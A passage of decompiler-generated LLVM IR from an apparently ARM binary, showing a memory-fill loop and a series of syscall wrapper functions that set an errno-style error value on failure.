  %v0_135f8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_135ec.pr, label %dec_label_pc_135f4, label %.thread

.thread:                                          ; preds = %bb
  %v2_135ec = add i32 %v0_135f8.pr.pre, -1
  store i32 %v2_135ec, i32* @r2, align 4
  %v1_135e4 = urem i32 %v6_135e8, 4
  %v2_135e4 = icmp eq i32 %v1_135e4, 0
  store i1 %v2_135e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135e4, label %dec_label_pc_135f4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_135e8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_135e8.pre to i8
  br label %bb

dec_label_pc_135f4:                               ; preds = %.thread, %bb, %dec_label_pc_135dc
  %v0_1360028 = phi i32 [ %tmp, %dec_label_pc_135dc ], [ %v6_135e8, %bb ], [ %v6_135e8, %.thread ]
  %v0_135f8.pr = phi i32 [ %v0_135d4, %dec_label_pc_135dc ], [ %v0_135f8.pr.pre, %bb ], [ %v2_135ec, %.thread ]
  %v0_135f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_135f4, i32* @ip, align 4
  %v8_135f810 = icmp eq i32 %v0_135f8.pr, 8
  store i1 %v8_135f810, i1* %cpsr_z.global-to-local, align 1
  %v5_135fc11 = icmp slt i32 %v0_135f8.pr, 8
  br i1 %v5_135fc11, label %dec_label_pc_13638, label %dec_label_pc_13600.preheader

dec_label_pc_13600.preheader:                     ; preds = %dec_label_pc_135f4
  %v1_1360046 = inttoptr i32 %v0_1360028 to i32*
  store i32 %v0_135f4, i32* %v1_1360046, align 4
  %v3_1360047 = add i32 %v0_1360028, 4
  %v4_1360048 = inttoptr i32 %v3_1360047 to i32*
  %v5_1360049 = load i32, i32* @ip, align 4
  store i32 %v5_1360049, i32* %v4_1360048, align 4
  %v6_1360050 = add i32 %v0_1360028, 8
  store i32 %v6_1360050, i32* @r3, align 4
  %v0_1360451 = load i32, i32* @r2, align 4
  %v1_1360452 = add i32 %v0_1360451, -8
  store i32 %v1_1360452, i32* %r2.global-to-local, align 4
  %v5_1360c53 = icmp slt i32 %v1_1360452, 8
  br i1 %v5_1360c53, label %dec_label_pc_13600.dec_label_pc_13638.loopexit_crit_edge, label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_13600.preheader, %dec_label_pc_135f8.dec_label_pc_13600_crit_edge
  %v6_1360055 = phi i32 [ %v6_13600, %dec_label_pc_135f8.dec_label_pc_13600_crit_edge ], [ %v6_1360050, %dec_label_pc_13600.preheader ]
  %v0_1360054 = phi i32 [ %v12_1362c, %dec_label_pc_135f8.dec_label_pc_13600_crit_edge ], [ %v0_1360028, %dec_label_pc_13600.preheader ]
  %v1_13610 = inttoptr i32 %v6_1360055 to i32*
  %v2_13610 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13610, i32* %v1_13610, align 4
  %v3_13610 = add i32 %v0_1360054, 12
  %v4_13610 = inttoptr i32 %v3_13610 to i32*
  %v5_13610 = load i32, i32* @ip, align 4
  store i32 %v5_13610, i32* %v4_13610, align 4
  %v6_13610 = add i32 %v0_1360054, 16
  store i32 %v6_13610, i32* @r3, align 4
  %v0_13614 = load i32, i32* %r2.global-to-local, align 4
  %v1_13614 = add i32 %v0_13614, -8
  store i32 %v1_13614, i32* %r2.global-to-local, align 4
  %v5_1361c = icmp slt i32 %v1_13614, 8
  br i1 %v5_1361c, label %dec_label_pc_13610.dec_label_pc_13638.loopexit_crit_edge, label %dec_label_pc_13620

dec_label_pc_13620:                               ; preds = %dec_label_pc_13610
  %v1_13620 = inttoptr i32 %v6_13610 to i32*
  %v2_13620 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13620, i32* %v1_13620, align 4
  %v3_13620 = add i32 %v0_1360054, 20
  %v4_13620 = inttoptr i32 %v3_13620 to i32*
  %v5_13620 = load i32, i32* @ip, align 4
  store i32 %v5_13620, i32* %v4_13620, align 4
  %v6_13620 = add i32 %v0_1360054, 24
  store i32 %v6_13620, i32* @r3, align 4
  %v0_13624 = load i32, i32* %r2.global-to-local, align 4
  %v1_13624 = add i32 %v0_13624, -8
  store i32 %v1_13624, i32* %r2.global-to-local, align 4
  %v5_1362c = icmp slt i32 %v1_13624, 8
  br i1 %v5_1362c, label %dec_label_pc_13620.dec_label_pc_13638.loopexit_crit_edge, label %dec_label_pc_135f8

dec_label_pc_135f8:                               ; preds = %dec_label_pc_13620
  %v7_1362c = inttoptr i32 %v6_13620 to i32*
  %v8_1362c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1362c, i32* %v7_1362c, align 4
  %v9_1362c = add i32 %v0_1360054, 28
  %v10_1362c = inttoptr i32 %v9_1362c to i32*
  %v11_1362c = load i32, i32* @ip, align 4
  store i32 %v11_1362c, i32* %v10_1362c, align 4
  %v12_1362c = add i32 %v0_1360054, 32
  store i32 %v12_1362c, i32* @r3, align 4
  %v6_13630 = load i32, i32* %r2.global-to-local, align 4
  %v7_13630 = add i32 %v6_13630, -8
  store i32 %v7_13630, i32* %r2.global-to-local, align 4
  %v5_135fc = icmp slt i32 %v7_13630, 8
  br i1 %v5_135fc, label %dec_label_pc_135f8.dec_label_pc_13638.loopexit_crit_edge, label %dec_label_pc_135f8.dec_label_pc_13600_crit_edge

dec_label_pc_135f8.dec_label_pc_13600_crit_edge:  ; preds = %dec_label_pc_135f8
  %v2_13600.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13600 = inttoptr i32 %v12_1362c to i32*
  store i32 %v2_13600.pre, i32* %v1_13600, align 4
  %v3_13600 = add i32 %v0_1360054, 36
  %v4_13600 = inttoptr i32 %v3_13600 to i32*
  %v5_13600 = load i32, i32* @ip, align 4
  store i32 %v5_13600, i32* %v4_13600, align 4
  %v6_13600 = add i32 %v0_1360054, 40
  store i32 %v6_13600, i32* @r3, align 4
  %v0_13604 = load i32, i32* %r2.global-to-local, align 4
  %v1_13604 = add i32 %v0_13604, -8
  store i32 %v1_13604, i32* %r2.global-to-local, align 4
  %v5_1360c = icmp slt i32 %v1_13604, 8
  br i1 %v5_1360c, label %dec_label_pc_13600.dec_label_pc_13638.loopexit_crit_edge, label %dec_label_pc_13610

dec_label_pc_135f8.dec_label_pc_13638.loopexit_crit_edge: ; preds = %dec_label_pc_135f8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13638

dec_label_pc_13600.dec_label_pc_13638.loopexit_crit_edge: ; preds = %dec_label_pc_135f8.dec_label_pc_13600_crit_edge, %dec_label_pc_13600.preheader
  %v1_13604.lcssa = phi i32 [ %v1_1360452, %dec_label_pc_13600.preheader ], [ %v1_13604, %dec_label_pc_135f8.dec_label_pc_13600_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13638

dec_label_pc_13610.dec_label_pc_13638.loopexit_crit_edge: ; preds = %dec_label_pc_13610
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13638

dec_label_pc_13620.dec_label_pc_13638.loopexit_crit_edge: ; preds = %dec_label_pc_13620
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_135f4, %dec_label_pc_135f8.dec_label_pc_13638.loopexit_crit_edge, %dec_label_pc_13600.dec_label_pc_13638.loopexit_crit_edge, %dec_label_pc_13610.dec_label_pc_13638.loopexit_crit_edge, %dec_label_pc_13620.dec_label_pc_13638.loopexit_crit_edge, %dec_label_pc_135d0
  %v0_13640 = phi i32 [ %v0_135d4, %dec_label_pc_135d0 ], [ %v1_13624, %dec_label_pc_13620.dec_label_pc_13638.loopexit_crit_edge ], [ %v1_13614, %dec_label_pc_13610.dec_label_pc_13638.loopexit_crit_edge ], [ %v1_13604.lcssa, %dec_label_pc_13600.dec_label_pc_13638.loopexit_crit_edge ], [ %v7_13630, %dec_label_pc_135f8.dec_label_pc_13638.loopexit_crit_edge ], [ %v0_135f8.pr, %dec_label_pc_135f4 ]
  %v2_13638 = icmp eq i32 %v0_13640, 0
  store i1 %v2_13638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13638, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13638
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13638
  %v1_13640 = sub i32 7, %v0_13640
  store i32 %v1_13640, i32* %r2.global-to-local, align 4
  %v3_13644 = mul i32 %v1_13640, 4
  %v4_13644 = add i32 %v3_13644, ptrtoint (i32* @global_var_1364c.539 to i32)
  call void @__pseudo_branch(i32 %v4_13644)
  %v0_1364c = load i32, i32* %r1.global-to-local, align 4
  %v1_1364c = trunc i32 %v0_1364c to i8
  %v2_1364c = load i32, i32* @r3, align 4
  %v3_1364c = inttoptr i32 %v2_1364c to i8*
  store i8 %v1_1364c, i8* %v3_1364c, align 1
  %v4_1364c = load i32, i32* @r3, align 4
  %v5_1364c = add i32 %v4_1364c, 1
  store i32 %v5_1364c, i32* %r3.global-to-local, align 4
  %v0_13650 = load i32, i32* %r1.global-to-local, align 4
  %v1_13650 = trunc i32 %v0_13650 to i8
  %v3_13650 = inttoptr i32 %v5_1364c to i8*
  store i8 %v1_13650, i8* %v3_13650, align 1
  %v4_13650 = load i32, i32* %r3.global-to-local, align 4
  %v5_13650 = add i32 %v4_13650, 1
  store i32 %v5_13650, i32* %r3.global-to-local, align 4
  %v0_13654 = load i32, i32* %r1.global-to-local, align 4
  %v1_13654 = trunc i32 %v0_13654 to i8
  %v3_13654 = inttoptr i32 %v5_13650 to i8*
  store i8 %v1_13654, i8* %v3_13654, align 1
  %v4_13654 = load i32, i32* %r3.global-to-local, align 4
  %v5_13654 = add i32 %v4_13654, 1
  store i32 %v5_13654, i32* %r3.global-to-local, align 4
  %v0_13658 = load i32, i32* %r1.global-to-local, align 4
  %v1_13658 = trunc i32 %v0_13658 to i8
  %v3_13658 = inttoptr i32 %v5_13654 to i8*
  store i8 %v1_13658, i8* %v3_13658, align 1
  %v4_13658 = load i32, i32* %r3.global-to-local, align 4
  %v5_13658 = add i32 %v4_13658, 1
  store i32 %v5_13658, i32* %r3.global-to-local, align 4
  %v0_1365c = load i32, i32* %r1.global-to-local, align 4
  %v1_1365c = trunc i32 %v0_1365c to i8
  %v3_1365c = inttoptr i32 %v5_13658 to i8*
  store i8 %v1_1365c, i8* %v3_1365c, align 1
  %v4_1365c = load i32, i32* %r3.global-to-local, align 4
  %v5_1365c = add i32 %v4_1365c, 1
  store i32 %v5_1365c, i32* %r3.global-to-local, align 4
  %v0_13660 = load i32, i32* %r1.global-to-local, align 4
  %v1_13660 = trunc i32 %v0_13660 to i8
  %v3_13660 = inttoptr i32 %v5_1365c to i8*
  store i8 %v1_13660, i8* %v3_13660, align 1
  %v4_13660 = load i32, i32* %r3.global-to-local, align 4
  %v5_13660 = add i32 %v4_13660, 1
  store i32 %v5_13660, i32* %r3.global-to-local, align 4
  %v0_13664 = load i32, i32* %r1.global-to-local, align 4
  %v1_13664 = trunc i32 %v0_13664 to i8
  %v3_13664 = inttoptr i32 %v5_13660 to i8*
  store i8 %v1_13664, i8* %v3_13664, align 1
  %v4_13664 = load i32, i32* %r3.global-to-local, align 4
  %v5_13664 = add i32 %v4_13664, 1
  store i32 %v5_13664, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13600, { 1, 0 }
  uselistorder i32 %v12_1362c, { 1, 2, 0 }
  uselistorder i32 %v0_1360054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_135f8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_135e8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_135dc, { 1, 0 }
  uselistorder i32 %v0_135d4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13638, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13610, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_13670(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13670:
  %v0_13670 = call i32 @function_17700()
  ret i32 %v0_13670
}

define i32 @function_13680() local_unnamed_addr {
dec_label_pc_13680:
  %v0_13680 = call i32 @function_17700()
  ret i32 %v0_13680
}

define i32 @function_13690(i32 %arg1) local_unnamed_addr {
dec_label_pc_13690:
  %stack_var_-12 = alloca i32, align 4
  %v2_13698 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_13698, i32* @r1, align 4
  %v0_1369c = call i32 @function_17f6c()
  %v2_136a0 = icmp eq i32 %v0_1369c, 0
  %v4_136a4 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_136a0, i32 -1, i32 %v4_136a4
  ret i32 %storemerge
}

define i32 @function_136b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_136b8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136b8 = load i32, i32* @r7, align 4
  store i32 %v3_136b8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_136e0, label %dec_label_pc_136d0

dec_label_pc_136d0:                               ; preds = %dec_label_pc_136b8
  %v0_136d0 = call i32 @function_13574()
  %v0_136d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_136d4 = sub i32 0, %v0_136d4
  %v2_136d8 = inttoptr i32 %v0_136d0 to i32*
  store i32 %v1_136d4, i32* %v2_136d8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_136e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136b8, %dec_label_pc_136d0
  %v2_136e4 = phi i32 [ %v3_136b8, %dec_label_pc_136b8 ], [ %v2_136e4.pre, %dec_label_pc_136d0 ]
  %v0_136e0 = phi i32 [ %arg1, %dec_label_pc_136b8 ], [ -1, %dec_label_pc_136d0 ]
  store i32 %v2_136e4, i32* %r7.global-to-local, align 4
  ret i32 %v0_136e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
}

define i32 @function_136f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_136f0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136f0 = load i32, i32* @r7, align 4
  store i32 %v3_136f0, i32* %stack_var_-8, align 4
  %v0_136fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_136fc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136fc, -4095
  br i1 %tmp, label %dec_label_pc_1371c, label %dec_label_pc_1370c

dec_label_pc_1370c:                               ; preds = %dec_label_pc_136f0
  %v0_1370c = call i32 @function_13574()
  %v0_13710 = load i32, i32* %r7.global-to-local, align 4
  %v1_13710 = sub i32 0, %v0_13710
  %v2_13714 = inttoptr i32 %v0_1370c to i32*
  store i32 %v1_13710, i32* %v2_13714, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1371c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1371c

dec_label_pc_1371c:                               ; preds = %dec_label_pc_136f0, %dec_label_pc_1370c
  %v1_13720 = phi i32 [ %v0_136fc, %dec_label_pc_136f0 ], [ -1, %dec_label_pc_1370c ]
  %v2_1371c = phi i32 [ %v3_136f0, %dec_label_pc_136f0 ], [ %v2_1371c.pre, %dec_label_pc_1370c ]
  store i32 %v2_1371c, i32* @r7, align 4
  ret i32 %v1_13720

; uselistorder directives
  uselistorder i32 %v0_136fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1371c, { 1, 0 }
}

define i32 @function_13728(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13728:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13728 = load i32, i32* @r7, align 4
  store i32 %v3_13728, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13750, label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %dec_label_pc_13728
  %v0_13740 = call i32 @function_13574()
  %v0_13744 = load i32, i32* %r7.global-to-local, align 4
  %v1_13744 = sub i32 0, %v0_13744
  store i32 %v1_13744, i32* @r3, align 4
  %v2_13748 = inttoptr i32 %v0_13740 to i32*
  store i32 %v1_13744, i32* %v2_13748, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13754.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13750

dec_label_pc_13750:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13740
  %v2_13754 = phi i32 [ %v3_13728, %dec_label_pc_13728 ], [ %v2_13754.pre, %dec_label_pc_13740 ]
  %v0_13750 = phi i32 [ %arg1, %dec_label_pc_13728 ], [ -1, %dec_label_pc_13740 ]
  store i32 %v2_13754, i32* @r7, align 4
  ret i32 %v0_13750

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13750, { 1, 0 }
}

define i32 @function_13760(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13760:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13760 = load i32, i32* @r7, align 4
  store i32 %v3_13760, i32* %stack_var_-8, align 4
  %v0_1376c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1376c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1376c, -4095
  br i1 %tmp, label %dec_label_pc_1378c, label %dec_label_pc_1377c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_13760
  %v0_1377c = call i32 @function_13574()
  %v0_13780 = load i32, i32* %r7.global-to-local, align 4
  %v1_13780 = sub i32 0, %v0_13780
  %v2_13784 = inttoptr i32 %v0_1377c to i32*
  store i32 %v1_13780, i32* %v2_13784, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1378c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1378c

dec_label_pc_1378c:                               ; preds = %dec_label_pc_13760, %dec_label_pc_1377c
  %v1_13790 = phi i32 [ %v0_1376c, %dec_label_pc_13760 ], [ -1, %dec_label_pc_1377c ]
  %v2_1378c = phi i32 [ %v3_13760, %dec_label_pc_13760 ], [ %v2_1378c.pre, %dec_label_pc_1377c ]
  store i32 %v2_1378c, i32* @r7, align 4
  ret i32 %v1_13790

; uselistorder directives
  uselistorder i32 %v0_1376c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1378c, { 1, 0 }
}

define i32 @function_13798(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13798:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_137cc, label %dec_label_pc_137bc

dec_label_pc_137bc:                               ; preds = %dec_label_pc_13798
  %v0_137bc = call i32 @function_13574()
  %v0_137c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_137c0 = sub i32 0, %v0_137c0
  %v2_137c4 = inttoptr i32 %v0_137bc to i32*
  store i32 %v1_137c0, i32* %v2_137c4, align 4
  br label %dec_label_pc_137cc

dec_label_pc_137cc:                               ; preds = %dec_label_pc_13798, %dec_label_pc_137bc
  %v1_137d4 = phi i32 [ %arg1, %dec_label_pc_13798 ], [ -1, %dec_label_pc_137bc ]
  ret i32 %v1_137d4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_137cc, { 1, 0 }
}

define i32 @function_137dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137dc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137dc = load i32, i32* @r7, align 4
  store i32 %v3_137dc, i32* %stack_var_-8, align 4
  %v0_137e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_137e8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137e8, -4095
  br i1 %tmp, label %dec_label_pc_13808, label %dec_label_pc_137f8

dec_label_pc_137f8:                               ; preds = %dec_label_pc_137dc
  %v0_137f8 = call i32 @function_13574()
  %v0_137fc = load i32, i32* %r7.global-to-local, align 4
  %v1_137fc = sub i32 0, %v0_137fc
  %v2_13800 = inttoptr i32 %v0_137f8 to i32*
  store i32 %v1_137fc, i32* %v2_13800, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13808.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13808

dec_label_pc_13808:                               ; preds = %dec_label_pc_137dc, %dec_label_pc_137f8
  %v1_1380c = phi i32 [ %v0_137e8, %dec_label_pc_137dc ], [ -1, %dec_label_pc_137f8 ]
  %v2_13808 = phi i32 [ %v3_137dc, %dec_label_pc_137dc ], [ %v2_13808.pre, %dec_label_pc_137f8 ]
  store i32 %v2_13808, i32* @r7, align 4
  ret i32 %v1_1380c

; uselistorder directives
  uselistorder i32 %v0_137e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13808, { 1, 0 }
}

define i32 @function_13810(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13810:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13810 = load i32, i32* @r7, align 4
  store i32 %v3_13810, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13838, label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %dec_label_pc_13810
  %v0_13828 = call i32 @function_13574()
  %v0_1382c = load i32, i32* %r7.global-to-local, align 4
  %v1_1382c = sub i32 0, %v0_1382c
  %v2_13830 = inttoptr i32 %v0_13828 to i32*
  store i32 %v1_1382c, i32* %v2_13830, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1383c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13838

dec_label_pc_13838:                               ; preds = %dec_label_pc_13810, %dec_label_pc_13828
  %v2_1383c = phi i32 [ %v3_13810, %dec_label_pc_13810 ], [ %v2_1383c.pre, %dec_label_pc_13828 ]
  %v0_13838 = phi i32 [ %arg1, %dec_label_pc_13810 ], [ -1, %dec_label_pc_13828 ]
  store i32 %v2_1383c, i32* @r7, align 4
  ret i32 %v0_13838

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13838, { 1, 0 }
}

define i32 @function_13848(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13848:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13848 = load i32, i32* @r4, align 4
  store i32 %v3_13848, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13878, label %dec_label_pc_13868

dec_label_pc_13868:                               ; preds = %dec_label_pc_13848
  %v0_13868 = call i32 @function_13574()
  %v0_1386c = load i32, i32* %r4.global-to-local, align 4
  %v1_1386c = sub i32 0, %v0_1386c
  %v2_13870 = inttoptr i32 %v0_13868 to i32*
  store i32 %v1_1386c, i32* %v2_13870, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1387c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13848, %dec_label_pc_13868
  %v2_1387c = phi i32 [ %v3_13848, %dec_label_pc_13848 ], [ %v2_1387c.pre, %dec_label_pc_13868 ]
  %v0_13878 = phi i32 [ %arg1, %dec_label_pc_13848 ], [ -1, %dec_label_pc_13868 ]
  store i32 %v2_1387c, i32* @r4, align 4
  ret i32 %v0_13878

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13878, { 1, 0 }
}

define i32 @function_13884(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13884:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13884 = load i32, i32* @r7, align 4
  store i32 %v3_13884, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_138ac, label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %dec_label_pc_13884
  %v0_1389c = call i32 @function_13574()
  %v0_138a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_138a0 = sub i32 0, %v0_138a0
  store i32 %v1_138a0, i32* @r3, align 4
  %v2_138a4 = inttoptr i32 %v0_1389c to i32*
  store i32 %v1_138a0, i32* %v2_138a4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_138b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138ac

dec_label_pc_138ac:                               ; preds = %dec_label_pc_13884, %dec_label_pc_1389c
  %v2_138b0 = phi i32 [ %v3_13884, %dec_label_pc_13884 ], [ %v2_138b0.pre, %dec_label_pc_1389c ]
  %v0_138ac = phi i32 [ %arg1, %dec_label_pc_13884 ], [ -1, %dec_label_pc_1389c ]
  store i32 %v2_138b0, i32* @r7, align 4
  ret i32 %v0_138ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138ac, { 1, 0 }
}

define i32 @function_138bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_138bc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_138bc = load i32, i32* @r4, align 4
  store i32 %v3_138bc, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_138ec, label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138bc
  %v0_138dc = call i32 @function_13574()
  %v0_138e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_138e0 = sub i32 0, %v0_138e0
  %v2_138e4 = inttoptr i32 %v0_138dc to i32*
  store i32 %v1_138e0, i32* %v2_138e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_138f0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_138ec

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_138dc
  %v2_138f0 = phi i32 [ %v3_138bc, %dec_label_pc_138bc ], [ %v2_138f0.pre, %dec_label_pc_138dc ]
  %v0_138ec = phi i32 [ %arg1, %dec_label_pc_138bc ], [ -1, %dec_label_pc_138dc ]
  store i32 %v2_138f0, i32* @r4, align 4
  ret i32 %v0_138ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138ec, { 1, 0 }
}

define i32 @function_138fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_138fc:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13930, label %dec_label_pc_13920

dec_label_pc_13920:                               ; preds = %dec_label_pc_138fc
  %v0_13920 = call i32 @function_13574()
  %v0_13924 = load i32, i32* %r4.global-to-local, align 4
  %v1_13924 = sub i32 0, %v0_13924
  store i32 %v1_13924, i32* @r3, align 4
  %v2_13928 = inttoptr i32 %v0_13920 to i32*
  store i32 %v1_13924, i32* %v2_13928, align 4
  br label %dec_label_pc_13930

dec_label_pc_13930:                               ; preds = %dec_label_pc_138fc, %dec_label_pc_13920
  %v1_13938 = phi i32 [ %arg1, %dec_label_pc_138fc ], [ -1, %dec_label_pc_13920 ]
  ret i32 %v1_13938

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13930, { 1, 0 }
}

